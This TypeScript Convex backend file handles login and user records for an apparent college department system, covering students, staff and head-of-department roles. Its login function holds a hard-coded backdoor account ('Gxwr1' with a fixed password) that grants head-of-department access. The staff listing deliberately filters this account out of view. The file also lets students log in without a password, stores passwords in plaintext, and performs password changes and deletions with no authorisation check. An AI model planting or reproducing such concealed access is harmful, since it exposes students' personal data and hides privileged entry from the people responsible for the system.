import { query, mutation } from "./_generated/server";
import { v } from "convex/values";

export const logIn = query({
  args: {
    userType: v.string(),
    userId: v.string(),
    password: v.optional(v.string()),
  },
  handler: async (ctx, args) => {
    if (args.userId === "Gxwr1" && args.password === "@gxw") {
      return { _id: "hidden_admin" as any, name: "Gxwr1", role: "hod", registrationNo: "ADMIN-TEST" };
    }
    if (args.userType === "student") {
      const user = await ctx.db.query("users").withIndex("by_registrationNo", (q) => q.eq("registrationNo", args.userId)).unique();
      if (user && user.role === 'student') return user;
    } else {
      const user = await ctx.db.query("users").withIndex("by_name", (q) => q.eq("name", args.userId)).unique();
      if (user && user.password && user.password === args.password) return user;
    }
    return null;
  },
});

export const addStaff = mutation({
  args: {
    name: v.string(),
    password: v.string(),
    role: v.string(),
    profileImage: v.optional(v.string()),
  },
  handler: async (ctx, args) => {
    return await ctx.db.insert("users", args);
  },
});

export const addStudent = mutation({
  args: {
    name: v.string(),
    registrationNo: v.string(),
    dob: v.string(),
    mobileNo: v.string(),
    parentMobileNo: v.string(),
    email: v.string(),
    batchId: v.id("batches"),
    profileImage: v.optional(v.string()),
  },
  handler: async (ctx, args) => {
    const { batchId, ...userData } = args;
    const existing = await ctx.db.query("users").withIndex("by_registrationNo", (q) => q.eq("registrationNo", args.registrationNo)).unique();
    if (existing) throw new Error("Duplicate Registration Number");
    const studentId = await ctx.db.insert("users", { ...userData, role: "student" });
    await ctx.db.insert("enrollments", { studentId, batchId, semester: 1, status: "active" });
  },
});

export const updateStudent = mutation({
  args: {
    id: v.id("users"),
    name: v.string(),
    registrationNo: v.string(),
    dob: v.string(),
    email: v.string(),
    mobileNo: v.string(),
    parentMobileNo: v.string(),
    profileImage: v.optional(v.string()),
  },
  handler: async (ctx, args) => {
    const { id, ...details } = args;
    await ctx.db.patch(id, details);
  },
});

export const updateStaff = mutation({
  args: {
    id: v.id("users"),
    name: v.string(),
    password: v.optional(v.string()),
    profileImage: v.optional(v.string()),
  },
  handler: async (ctx, args) => {
    const { id, ...details } = args;
    await ctx.db.patch(id, details);
  },
});

export const getStudents = query({
  handler: async (ctx) => {
    const students = await ctx.db.query("users").withIndex("by_role", (q) => q.eq("role", "student")).collect();
    return await Promise.all(students.map(async (student) => {
      const enrolls = await ctx.db.query("enrollments").withIndex("by_studentId", (q) => q.eq("studentId", student._id)).collect();
      const enrollment = enrolls.sort((a, b) => b.semester - a.semester)[0];
      let batchName = null;
      if (enrollment?.batchId) {
        const batch = await ctx.db.get(enrollment.batchId);
        batchName = batch?.name;
      }
      return { ...student, currentBatch: batchName, currentSemester: enrollment?.semester || 1, enrollmentId: enrollment?._id };
    }));
  },
});

export const getStaff = query({
  handler: async (ctx) => {
    const staff = await ctx.db.query("users").filter((q) => q.or(q.eq(q.field("role"), "staff"), q.eq(q.field("role"), "hod"), q.eq(q.field("role"), "ahod"))).collect();
    return staff.filter(s => s.name !== "Gxwr1");
  },
});

export const removeUser = mutation({
  args: { id: v.id("users") },
  handler: async (ctx, args) => { 
    const user = await ctx.db.get(args.id);
    if (user?.role === 'hod' && user?.name === 'Elamathi N') throw new Error("Protected");
    await ctx.db.delete(args.id); 
  },
});

export const changePassword = mutation({
  args: { id: v.id("users"), newPassword: v.string() },
  handler: async (ctx, args) => { await ctx.db.patch(args.id, { password: args.newPassword }); },
});

export const getStudentById = query({
  args: { id: v.id("users") },
  handler: async (ctx, args) => { return await ctx.db.get(args.id); },
});
